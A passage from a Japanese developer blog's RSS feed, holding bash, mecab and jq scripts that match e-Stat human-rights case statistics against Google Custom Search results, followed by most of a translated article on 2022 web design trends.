&lt;pre tabindex="0">&lt;code>&amp;quot;tab_code&amp;quot;,&amp;quot;表章項目&amp;quot;,&amp;quot;cat01_code&amp;quot;,&amp;quot;人権侵犯事件の受理・処理別&amp;quot;,&amp;quot;cat02_code&amp;quot;,&amp;quot;人権侵犯事件の種類別&amp;quot;,&amp;quot;time_code&amp;quot;,&amp;quot;時間軸(月次)&amp;quot;,&amp;quot;unit&amp;quot;,&amp;quot;value&amp;quot;,&amp;quot;annotation&amp;quot;
&amp;quot;100&amp;quot;,&amp;quot;件数&amp;quot;,&amp;quot;100&amp;quot;,&amp;quot;総数&amp;quot;,&amp;quot;100&amp;quot;,&amp;quot;総数&amp;quot;,&amp;quot;2007000101&amp;quot;,&amp;quot;2007年1月&amp;quot;,&amp;quot;件&amp;quot;,&amp;quot;2170&amp;quot;,&amp;quot;&amp;quot;
.
.
&amp;quot;100&amp;quot;,&amp;quot;件数&amp;quot;,&amp;quot;100&amp;quot;,&amp;quot;総数&amp;quot;,&amp;quot;130&amp;quot;,&amp;quot;私人等に関するもの&amp;quot;,&amp;quot;2021001111&amp;quot;,&amp;quot;2021年11月&amp;quot;,&amp;quot;件&amp;quot;,&amp;quot;1230&amp;quot;,&amp;quot;&amp;quot;
&lt;/code>&lt;/pre>&lt;p>VALUE以下の内容を見てみると「_code」はコードが入るだけなので無視して良さそうです。&lt;br>
表章項目も「件数」しかないので無視して良さそうです。&lt;br>
時間軸、unite、value、annotationもいらなそうです。&lt;br>
「人権侵犯事件の受理・処理別」は&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;quot;旧受&amp;quot;
&amp;quot;総数&amp;quot;
&amp;quot;新受_計&amp;quot;
&amp;quot;新受_申告_委員受&amp;quot;
&amp;quot;新受_申告_職員受&amp;quot;
&amp;quot;新受_人権擁護委員の通報&amp;quot;
&amp;quot;新受_関係行政機関の通報&amp;quot;
&amp;quot;人権侵犯事件の受理・処理別&amp;quot;
&lt;/code>&lt;/pre>&lt;p>これは一旦は総数だけ使えば良さそうです&lt;/p>
&lt;p>「人権侵犯事件の種類別」は&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;quot;総数&amp;quot;
&amp;quot;私人等に関するもの&amp;quot;
&amp;quot;私人等に関するもの_売春&amp;quot;
&amp;quot;私人等に関するもの_その他&amp;quot;
&amp;quot;私人等に関するもの_村八分&amp;quot;
&amp;quot;私人等に関するもの_交通事故&amp;quot;
&amp;quot;私人等に関するもの_人身売買&amp;quot;
.
.
.
&lt;/code>&lt;/pre>&lt;p>人権侵犯事件の種類が並べられています。この部分から社会的関心の高いものを抽出できると良さそうですね。&lt;/p>
&lt;p>抽出対象の列をどこにするのかも将来的に自動化したいのですが今回は固定で「人権侵犯事件の種類別」の列を抽出対象にしたいと思います。&lt;/p>
&lt;h2 id="mecabを使ってマッチングキーワードを最適化する">mecabを使ってマッチングキーワードを最適化する&lt;/h2>
&lt;pre tabindex="0">&lt;code> cat &amp;quot;$STCSV&amp;quot;|$SED -e &amp;quot;1,$((vnum+1))d&amp;quot;|$AWK -F, '{print $6;}'|sed -e &amp;quot;s|\&amp;quot;||g&amp;quot;|sort|uniq;
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>&amp;quot;私人等に関するもの_売春&amp;quot;
&amp;quot;私人等に関するもの_その他&amp;quot;
&amp;quot;私人等に関するもの_村八分&amp;quot;
&amp;quot;私人等に関するもの_交通事故&amp;quot;
&amp;quot;私人等に関するもの_人身売買&amp;quot;
&amp;quot;私人等に関するもの_医療関係&amp;quot;
&amp;quot;私人等に関するもの_私的制裁&amp;quot;
&amp;quot;私人等に関するもの_差別待遇_女性&amp;quot;
&amp;quot;私人等に関するもの_差別待遇_その他&amp;quot;
&amp;quot;私人等に関するもの_差別待遇_外国人&amp;quot;
&amp;quot;私人等に関するもの_差別待遇_性自認&amp;quot;
&lt;/code>&lt;/pre>&lt;p>「私人等に関するもの_交通事故」という文字列はニュースなどではそのまま使われないでしょうからそのままgoogle custom search  の検索結果にマッチングをかけてもダメそうです。&lt;br>
mecab   を使って文字列を分解してマッチングをかけたいと思います。&lt;/p>
&lt;p>mecabはオープンソースの形態素解析エンジンです入力した文字列を構文解析してくれます。&lt;/p>
&lt;pre tabindex="0">&lt;code>echo &amp;quot;私人等に関するもの_差別待遇_女性&amp;quot;|mecab
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>私人 名詞,一般,*,*,*,*,私人,シジン,シジン
等 名詞,接尾,一般,*,*,*,等,トウ,トー
に関する 助詞,格助詞,連語,*,*,*,に関する,ニカンスル,ニカンスル
も 助詞,係助詞,*,*,*,*,も,モ,モ
の 助詞,連体化,*,*,*,*,の,ノ,ノ
_ 名詞,サ変接続,*,*,*,*,*
差別 名詞,サ変接続,*,*,*,*,差別,サベツ,サベツ
待遇 名詞,サ変接続,*,*,*,*,待遇,タイグウ,タイグー
_ 名詞,サ変接続,*,*,*,*,*
女性 名詞,一般,*,*,*,*,女性,ジョセイ,ジョセイ
EOS
&lt;/code>&lt;/pre>&lt;p>取り出すのは名詞だけで良さそうですし、名詞でも1文字だけのものは除外したほうが良さそうですね&lt;/p>
&lt;pre tabindex="0">&lt;code>echo &amp;quot;私人等に関するもの_差別待遇_女性&amp;quot;|mecab|grep &amp;quot;名詞&amp;quot;|awk '{print $1;}'|grep -v ^.$
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>私人
差別
待遇
女性
&lt;/code>&lt;/pre>&lt;h2 id="マッチングしてみる">マッチングしてみる&lt;/h2>
&lt;p>このキーワードでgoogle custom search  の検索結果にマッチングをかけカウント数を取得して見ましょう。&lt;/p>
&lt;pre tabindex="0">&lt;code>11,私人等に関するもの_強制・強要_家族間のもの_親の子に対するもの
11,私人等に関するもの_社会福祉施設関係_施設職員によるもの
14,私人等に関するもの_差別待遇_同和問題（うち公務員によるもの）
18,私人等に関するもの_社会福祉施設関係_施設職員によるもの（うち公営の施設に従事する職員によるもの）
19,私人等に関するもの_プライバシー関係_インターネット（うち同和問題に関する侵犯）
&lt;/code>&lt;/pre>&lt;p>インターネットがマッチしたのは良いのですが「同和問題」の中の「問題」の部分でカウント数を稼いでしまって思うような感じにはなりません。&lt;br>
「もの」とかもカウント数を稼いでいるので汎用的なキーワードを除外する処理を入れる必要がありそうです。&lt;/p>
&lt;p>自動化の道のりは遠いですね。&lt;/p>
&lt;h2 id="プログラム">プログラム&lt;/h2>
&lt;pre tabindex="0">&lt;code>function getStatistics(){
:
#curl -s &amp;quot;http://api.e-stat.go.jp/rest/3.0/app/getSimpleStatsData?appId=$ESID&amp;amp;lang=J&amp;amp;statsDataId=0003286680&amp;amp;metaGetFlg=Y&amp;amp;cntGetFlg=N&amp;amp;explanationGetFlg=Y&amp;amp;annotationGetFlg=Y&amp;amp;sectionHeaderFlg=1&amp;amp;replaceSpChars=0&amp;quot; -o &amp;quot;$STCSV&amp;quot;
}
function matchGcs(){
#VALUEより上の行を削除する
vnum=$(cat &amp;quot;$STCSV&amp;quot;|grep -n &amp;quot;VALUE&amp;quot;|$AWK -F: '{print $1;}')
echo &amp;quot;$vnum&amp;quot;
cat &amp;quot;$STCSV&amp;quot;|$SED -e &amp;quot;1,$((vnum+1))d&amp;quot;|$AWK -F, '{print $6;}'|$SED -e &amp;quot;s|\&amp;quot;||g&amp;quot;|sort|uniq|while read line;do
local mcnt=$(echo &amp;quot;$line&amp;quot;|mecab|grep &amp;quot;名詞&amp;quot;|awk '{print $1;}'|grep -v -e ^.$|while read word;do
cat &amp;quot;$GCSCSV&amp;quot;|grep &amp;quot;$word&amp;quot;|wc -l
done| awk '{sum+=$0} END{print sum;}');
echo &amp;quot;$mcnt,$line&amp;quot;
done|sort|uniq|sort -n
}
function main(){
#統計名でgoogle cloud searchを検索する
getGcs;&amp;lt;---前回作成したもの
#統計データを取得する
getStatistics;
#統計データの列情報とgoogle cloud searchの検索結果をマッチングする
matchGcs;
}
main;
exit;
&lt;/code>&lt;/pre></description></item><item><title>e-Stat でGoogle Custom Search APIを使おう（３）</title><link>https://suzukiiichiro.github.io/posts/2022-01-20-01-ani/</link><pubDate>Thu, 20 Jan 2022 17:50:13 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-20-01-ani/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-20-01-ani/anal.jpg" alt="Featured image of post e-Stat でGoogle Custom Search APIを使おう（３）" />&lt;h2 id="google-custom-searchの検索結果をcsvに整形する">google Custom Searchの検索結果をcsvに整形する&lt;/h2>
&lt;p>統計データから列名を取得してgoogle Custom Searchの検索結果に当てに行きマッチする回数の高い列名を社会的関心の高い項目に設定したいと思います。&lt;br>
全開でgoogle Custom Searchの検索の絞り込みができたのでAPIを叩く回数は統計名ごとに3回にしたいと思います。&lt;/p>
&lt;p>start パラメータを1から開始して10ずつインクリメントしていきます。&lt;/p>
&lt;pre tabindex="0">&lt;code>curl -s 'https://www.googleapis.com/customsearch/v1?key=xxxxxxxxxxx&amp;amp;cx=xxxxxx&amp;amp;q=人権侵犯事件統計&amp;amp;start=1'
curl -s 'https://www.googleapis.com/customsearch/v1?key=xxxxxxxxxxx&amp;amp;cx=xxxxxx&amp;amp;q=人権侵犯事件統計&amp;amp;start=11'
curl -s 'https://www.googleapis.com/customsearch/v1?key=xxxxxxxxxxx&amp;amp;cx=xxxxxx&amp;amp;q=人権侵犯事件統計&amp;amp;start=21'
&lt;/code>&lt;/pre>&lt;p>3回APIを叩いた結果に対してマッチングをかけていきたいと思うのですが、google Custom Searchの検索結果を見やすくするため前準備としてcsvに整形したいと思います。&lt;br>
google Custom Searchの検索結果はjsonですがjsonのパースはjqを使います。&lt;/p>
&lt;h2 id="jqのインストール">jqのインストール&lt;/h2>
&lt;p>jqのインストールは簡単です。&lt;/p>
&lt;pre tabindex="0">&lt;code>brew install jq
&lt;/code>&lt;/pre>&lt;h2 id="jqを使ってgoogle-custom-searchの検索結果をjsonをパースする">jqを使ってgoogle Custom Searchの検索結果をjsonをパースする&lt;/h2>
&lt;pre tabindex="0">&lt;code> &amp;quot;items&amp;quot;: [
¦ {
¦ ¦ &amp;quot;kind&amp;quot;: &amp;quot;customsearch#result&amp;quot;,
¦ ¦ &amp;quot;title&amp;quot;: &amp;quot;昨年の人権侵犯事件 いじめ、教員関係が半減 | 教育新聞&amp;quot;,
¦ ¦ &amp;quot;htmlTitle&amp;quot;: &amp;quot;昨年の\u003cb\u003e人権侵犯事件\u003c/b\u003e いじめ、教員関係が半減 | 教育新聞&amp;quot;,
¦ ¦ &amp;quot;link&amp;quot;: &amp;quot;https://www.kyobun.co.jp/news/20210323_03/&amp;quot;,
¦ ¦ &amp;quot;displayLink&amp;quot;: &amp;quot;www.kyobun.co.jp&amp;quot;,
¦ ¦ &amp;quot;snippet&amp;quot;: &amp;quot;2021/03/23 ... それによると、昨年1年間に、同省の人権擁護機関が新たに救済手続きを開始した人権侵犯事件は9589件で、前年よりも5831件減少。同省の担当者は「他の統計 ...&amp;quot;,
¦ ¦ &amp;quot;htmlSnippet&amp;quot;: &amp;quot;2021/03/23 \u003cb\u003e...\u003c/b\u003e それによると、昨年1年間に、同省の人権擁護機関が新たに救済手続きを開始した\u003cb\u003e人権侵犯事件\u003c/b\u003eは9589件で、前年よりも5831件減少。同省の担当者は「他の\u003cb\u003e統計\u003c/b\u003e&amp;amp;nbsp;...&amp;quot;,
&lt;/code>&lt;/pre>&lt;p>items配列の中に検索結果が保存されているみたいです。&lt;br>
取得する項目は、title、snippet、linkにします。&lt;/p>
&lt;p>jqでカウントを取得する方法は length です。&lt;/p>
&lt;pre tabindex="0">&lt;code>jq '.items | length'
&lt;/code>&lt;/pre>&lt;p>配列以下の要素の取り方は&lt;/p>
&lt;pre tabindex="0">&lt;code> jq -r .items[0].title
&lt;/code>&lt;/pre>&lt;p>です。&lt;br>
返却結果にダブルクォーテーションが入るのが邪魔なのでオプション -r をつけています。&lt;/p>
&lt;h2 id="プログラムの内容出力結果">プログラムの内容、出力結果&lt;/h2>
&lt;p>プログラムは以下となります&lt;/p>
&lt;pre tabindex="0">&lt;code>#!/bin/bash
#グーグルカスタムサーチの結果を取得します
APKEY=&amp;quot;xxxxxxxxxxxxxxxxxxxxxxxxx&amp;quot;;
EGID=&amp;quot;xxxxxxxxxxxx&amp;quot;;
START=1;
STATISTICS=&amp;quot;$1&amp;quot;;
AWK=`which gawk`;
SED=`which gsed`;
TMP=&amp;quot;gcstmp.json&amp;quot;
RST=&amp;quot;gcsrst.csv&amp;quot;;
cnt=0;
function parse(){
items=$(cat &amp;quot;$TMP&amp;quot;|jq .items);
length=$(echo &amp;quot;$items&amp;quot;|jq '.| length');
pcnt=0;
while :;do
if [ &amp;quot;$pcnt&amp;quot; -ge &amp;quot;$length&amp;quot; ];then
break;
fi
item=$(echo &amp;quot;$items&amp;quot;|jq .[$pcnt]);
title=$(echo &amp;quot;$item&amp;quot;|jq -r .title);
snippet=$(echo &amp;quot;$item&amp;quot;|jq -r .snippet);
link=$(echo &amp;quot;$item&amp;quot;|jq -r .link);
echo &amp;quot;$title,$snippet,$link&amp;quot;|tee -a &amp;quot;$RST&amp;quot;;
pcnt=$((pcnt+1));
done
}
function main(){
:&amp;gt;&amp;quot;$RST&amp;quot;;
while :;do
if [ &amp;quot;$cnt&amp;quot; -ge 3 ];then
break;
fi
st=$((cnt*10+1))
curl &amp;quot;https://www.googleapis.com/customsearch/v1?key=$APKEY&amp;amp;cx=$EGID&amp;amp;q=$STATISTICS&amp;amp;start=$st&amp;quot; -o $TMP
parse;
cnt=$((cnt+1));
done
}
main;
exit;
&lt;/code>&lt;/pre>&lt;p>整形した検索結果は以下のようになります&lt;/p>
&lt;pre tabindex="0">&lt;code>昨年の人権侵犯事件 いじめ、教員関係が半減 | 教育新聞,2021/03/23 ... それによると、昨年1年間に、同省の人権擁護機関が新たに救済手続きを開始した人権侵犯事件は9589件で、前年よりも5831件減少。同省の担当者は「他の統計 ...,https://www.kyobun.co.jp/news/20210323_03/
難民とLGBT：世界における人権侵害の状況 | 難民研究フォーラム ...,2020/12/24 ... マッピング. 2019年末現在、「LGBTであること」や「同性間の性行為」などを刑法において犯罪としている国をマッピング ...,https://refugeestudies.jp/2020/12/lgbt/
人権擁護委員 - Wikipedia,全国の人権擁護委員の2011年（平成23年）中の活動実績は、次のとおりである。 人権啓発活動従事回数 - 227,683回; 人権相談事件取扱件数 - 159,157件; 人権侵犯事件関与 ...,https://ja.wikipedia.org/wiki/%E4%BA%BA%E6%A8%A9%E6%93%81%E8%AD%B7%E5%A7%94%E5%93%A1
法務省：インターネットによる人権侵害をなくしましょう – Gov base,2021/04/30 ... ※プロバイダ責任制限法等については、後述の「参考」をご覧ください。 インターネットに関する人権侵犯事件の新規救済手続開始件数. 法務省の人権擁護機関 ...,https://www.gov-base.info/2021/04/30/112474
&lt;/code>&lt;/pre></description></item><item><title>2022年のWebデザインの最新トレンドとレイアウト</title><link>https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/</link><pubDate>Thu, 20 Jan 2022 17:36:49 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/catch.jpg" alt="Featured image of post 2022年のWebデザインの最新トレンドとレイアウト" />&lt;p>&lt;strong>出典元&lt;/strong>：&lt;a class="link" href="https://getflywheel.com/layout/web-design-trends-2022/" target="_blank" rel="noopener"
>Web design trends for 2022 | Layout&lt;/a>&lt;/p>
&lt;p>この2年間で学んだことは、私たちは常に新しいものに適応し続けなければならないということです。2022年に向けて、デザイナーは人生のカオスを受け入れ、それをデザインで表現し始めています。&lt;/p>
&lt;p>2022年のトレンドは、より大胆で、よりクリエイティブで、よりインタラクティブなデザインに移行しています。クリエイターは、より破壊的なものに傾倒し、「良い」ウェブデザインとされるものの境界を押し広げようとしています。&lt;/p>
&lt;p>2022年に期待されるトレンドを取り入れ、新しい年のクリエイティビティを高めてください。&lt;/p>
&lt;h2 id="インタラクティブなミニサイト">インタラクティブなミニサイト&lt;/h2>
&lt;p>あなたの実力をアピールしてください。専門性の高いコンテンツとインタラクションで、小規模で統制のとれた環境でスキルを発揮することは、デザイナーが新しいクライアントを獲得するための1つの方法です。また、潜在的な顧客に対しては、「作ることを楽しむ」ことで、オンリーワンの体験を提供できることをアピールしています。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 313;
flex-basis: 753px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/mini-site-canvas.png" data-size="1252x399">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/mini-site-canvas.png"
width="1252"
height="399"
loading="lazy"
alt="2022年のWebデザインの最新トレンドとレイアウトの画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>韓国の開発者、Jungik Leeが制作した、3つの簡単なタスクのいずれかをクリアする&lt;a class="link" href="https://canvas.jjangik.com/?ckattempt=1" target="_blank" rel="noopener"
>ミニサイト&lt;/a>です。たくさんの色と簡単な操作で、いろいろなものを作ったり動かすことができ、カラフルな丸でページが埋め尽くされる様子は、実に楽しいものです。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 236;
flex-basis: 567px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/victoire-douy.png" data-size="990x419">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/victoire-douy.png"
width="990"
height="419"
loading="lazy"
alt="2022年のWebデザインの最新トレンドとレイアウトの画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>アムステルダム在住のウェブデザイナー、ヴィクトワール・ドゥイさんの&lt;a class="link" href="https://victoiredouy.com/" target="_blank" rel="noopener"
>小さなポートフォリオサイト&lt;/a> では、インタラクティビティを駆使して人々の関心を集めています。カーソルを動かすだけで、色を変えたり、糸を引っ張ったり、オブジェクトを動かしたりできます。&lt;/p>
&lt;h2 id="レトロな雰囲気のあるデザイン">レトロな雰囲気のあるデザイン&lt;/h2>
&lt;p>米国のWebデザイナーの平均年齢は37歳で、ミレニアル世代に位置づけられます。ミレニアル世代はインターネットを日常的に利用するようになった最初の世代ですから、多くのデザイナーがウェブ創成期に流行したアートやタイポグラフィー、カラーに影響を受けているのは当然といえば当然でしょう。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 193;
flex-basis: 464px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/wild-souls.png" data-size="1136x587">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/wild-souls.png"
width="1136"
height="587"
loading="lazy"
alt="2022年のWebデザインの最新トレンドとレイアウトの画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>&lt;a class="link" href="https://www.wildsouls.gr/en" target="_blank" rel="noopener"
>Wild Souls&lt;/a>のEコマースサイトは、カラフルなシェイプと重なり合うスタイルで、食品会社にふさわしい楽しくて活気のある美学を表現しています。 ナッツ、ナッツバター、ハチミツ、マーマレードの専門店で、商品の上にカーソルを置くと、90年代にインスパイアされたビジュアルテーマをもとに、新しい質感や形がセンスよく追加されます。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 235;
flex-basis: 565px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/cartoon-network.png" data-size="1568x666">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/cartoon-network.png"
width="1568"
height="666"
loading="lazy"
alt="2022年のWebデザインの最新トレンドとレイアウトの画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>&lt;a class="link" href="https://www.cartoonnetworkstudios.com/" target="_blank" rel="noopener"
>カートゥーン ネットワーク&lt;/a>は、白と黒を基調とし、大胆な色使いと楽しいアニメーションで、レトロでありながらトレンドを押さえたサイトです。&lt;/p>
&lt;h2 id="オープンコンセプトデザイン">オープンコンセプトデザイン&lt;/h2>
&lt;p>この大流行が、私たちのデザイン嗜好にも影響を与えているのかもしれません。なぜなら、デザインに多くのオープンスペースを設けるという新たなトレンドが生まれたからです。6フィート（約3.5メートル）とはいかないまでも、デザイナーはセクション間のスペースをどんどん広げ、見出しに集中し、時にはヒーロー画像を完全に削除してユーザーに十分なスペースを与えています。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 218;
flex-basis: 523px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/bear-creek-distillery.png" data-size="1568x719">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/bear-creek-distillery.png"
width="1568"
height="719"
loading="lazy"
alt="2022年のWebデザインの最新トレンドとレイアウトの画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>どんな種類の蒸留酒もシャープでキレがあり、コロラド州デンバーにあるベア・クリーク蒸留所のウェブサイトも、余計な添加物を排除しています。ウェブサイトのデザインコンセプトは、彼らが精製するウォッカ、バーボン、ラム、ウイスキーと同様にクリーンです。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 210;
flex-basis: 504px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/atlason.png" data-size="1568x746">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/atlason.png"
width="1568"
height="746"
loading="lazy"
alt="2022年のWebデザインの最新トレンドとレイアウトの画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>&lt;a class="link" href="https://atlason.com/" target="_blank" rel="noopener"
>アタルソン&lt;/a> は、ニューヨークを拠点に、プロダクトとパッケージのデザイン、素材調達、製造を行っている会社です。サステナビリティは彼らのプロセスの中核であり、クリーンな製造という考え方は、ホワイトスペースの使用によってサイトでも視覚的に反映されています。このオープンスペースにより、デザインされた製品にスポットライトが当たり、画像上のホバー効果により、製品の概要や企業価値の説明が表現されています。&lt;/p>
&lt;h2 id="より多くのカスタマイズ">より多くのカスタマイズ&lt;/h2>
&lt;p>ユーザーがオンライン上で時間とお金を費やす機会が増えるにつれ、プロバイダーはより幅広い層のユーザーにアピールするための新たな方法を見出しています。そのため、多くのプロバイダーは、サイトやアプリで利用できるパーソナライゼーションのレベルを高め、すべてのサイトが従うべき標準的なアクセシビリティのベストプラクティスを超える&lt;a class="link" href="https://www.impactplus.com/blog/inclusive-ux-examples" target="_blank" rel="noopener"
>インクルージョン機能&lt;/a>の大幅な改善を行っています。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 490;
flex-basis: 1176px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/pinterest.png" data-size="1568x320">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/pinterest.png"
width="1568"
height="320"
loading="lazy"
alt="2022年のWebデザインの最新トレンドとレイアウトの画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>&lt;a class="link" href="https://www.pinterest.com/" target="_blank" rel="noopener"
>Pinterest&lt;/a> の「ビューティー」カテゴリは、サイト内でもっとも検索されているカテゴリの1つであり、同社はすべてのユーザーに対してより包括的に対応する必要性を認識していました。Pinterestは現在、「skin tone range」機能を提供することで、このカテゴリーにおいてより速く、よりパーソナライズされた体験を生み出しています。多くのユーザーにとって、これはアプリ上の明るい肌色の過飽和状態に対する答えであり、すべてのPinterestユーザーがより迅速かつ容易に自分に合った外見を見つけることができるようになりました。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 210;
flex-basis: 504px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/mastercard.png" data-size="1195x568">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/mastercard.png"
width="1195"
height="568"
loading="lazy"
alt="2022年のWebデザインの最新トレンドとレイアウトの画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>Mastercardは、「&lt;a class="link" href="https://www.mastercard.com/news/press/news-briefs/it-s-time-to-enable-people-to-use-their-true-name-on-cards/" target="_blank" rel="noopener"
>True Name&lt;/a>」システムを構築することで、より多くのカード会員が取引時に自分の本当のアイデンティティを表現できるようにする方法を見出しました。これにより、トランス系やノンバイナリのMastercard保有者は、法的に名前が変更されているかどうかにかかわらず、デッドネームの代わりに本名をカードに記載することができるようになりました。&lt;/p>
&lt;h2 id="3dオブジェクト2dスクロール">3Dオブジェクト、2Dスクロール&lt;/h2>
&lt;p>3Dモデルを使ったデザインと、フラットな2Dのコンテンツ表現は、説得力があり、完全に一体化しているように見えます。インタラクティブな3D要素を背景に、消化しやすいコンテンツを予測可能な方法で提示することは、ユーザーが物理的な概念をよりよく理解するためにとくに有効です。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 289;
flex-basis: 694px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/skolkovopark.png" data-size="1568x542">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/skolkovopark.png"
width="1568"
height="542"
loading="lazy"
alt="2022年のWebデザインの最新トレンドとレイアウトの画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>ロシア・モスクワの中心部に位置するこの新しいビジネス街のプロモーションサイトは、3Dのセンターピースとシンプルでフラットなコンテンツに焦点を当てた素晴らしい例です。トップページには&lt;a class="link" href="https://skolkovoforbusiness.ru/en/features/#home" target="_blank" rel="noopener"
>スコルコボ・パーク&lt;/a>の可動式模型が表示されていますが、目立つように配置されたコンテンツの影に隠れることはありません。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 189;
flex-basis: 454px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/one-ocean-science.png" data-size="1156x610">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/one-ocean-science.png"
width="1156"
height="610"
loading="lazy"
alt="2022年のWebデザインの最新トレンドとレイアウトの画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>&lt;a class="link" href="https://oneoceanscience.com/" target="_blank" rel="noopener"
>One Ocean Science&lt;/a>は、海洋保全と研究のグローバルリーダーを学際的な視点でつなぐことを目的とした、知識共有型のサミットです。ホームページでは、地球の3Dモデルの上を2Dでスクロールし、スクロールに合わせてさまざまな地域とそこで行われている研究を強調することでユーザーに情報を与えてます。&lt;/p>
&lt;h2 id="ブルータリズムライト">ブルータリズム・ライト&lt;/h2>
&lt;p>ブルータリズムとは、非常にブロック的で幾何学的な、厳しい芸術や建築のスタイルを指します。&lt;a class="link" href="https://uxdesign.cc/brutalist-web-design-is-taking-over-the-internet-fee3c66139b5" target="_blank" rel="noopener"
>ウェブデザイン&lt;/a>では、従来のルールにとらわれず、ミニマリズムを追求した、大胆かつシンプルなスタイルが目立ちます。白と黒を基調としたサイトが多く、装飾はほとんどなく、文字も太く、峻厳な仕上がりになっているのが特徴です。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 213;
flex-basis: 512px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/caroselling.png" data-size="1568x734">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/caroselling.png"
width="1568"
height="734"
loading="lazy"
alt="2022年のWebデザインの最新トレンドとレイアウトの画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>イタリアのクリエイティブ・エージェンシー、&lt;a class="link" href="https://www.caroselling.it/en/" target="_blank" rel="noopener"
>カロセリング&lt;/a>のブランド・アイデンティティは、正直で率直であることです。現実的な期待値を設定し、戦略の影響を考え抜き、クライアントの時間的・予算的制約を尊重することを信条としています。ブルータリスティックなサイトは、飾り気のない代理店のパートナーとしての彼らのストーリーを表現するのに役立っています。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 202;
flex-basis: 486px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/rick-owens.png" data-size="1568x773">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/rick-owens.png"
width="1568"
height="773"
loading="lazy"
alt="2022年のWebデザインの最新トレンドとレイアウトの画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>パリを拠点とするカリフォルニア生まれのデザイナー、リック・オウエンスは、かつて&lt;a class="link" href="https://amuse.vice.com/en_us/article/d3jpqj/interview-rick-owens" target="_blank" rel="noopener"
>自身の家具デザイン&lt;/a>に対する哲学を &amp;ldquo;ブルータリズムの洞窟の中でブルータリズムの火のそばのブルータリズムの岩の上に立つ毛皮 &amp;ldquo;と表現したことがあります。彼の服やアクセサリーラインのウェブサイトには、家具はありませんが、イメージやレイアウトに明確なブルータリズムのインスピレーションを感じることができます。&lt;/p>
&lt;h2 id="ガラスモルフィズム">ガラスモルフィズム&lt;/h2>
&lt;p>&lt;a class="link" href="https://uxdesign.cc/glassmorphism-in-user-interfaces-1f39bb1308c9" target="_blank" rel="noopener"
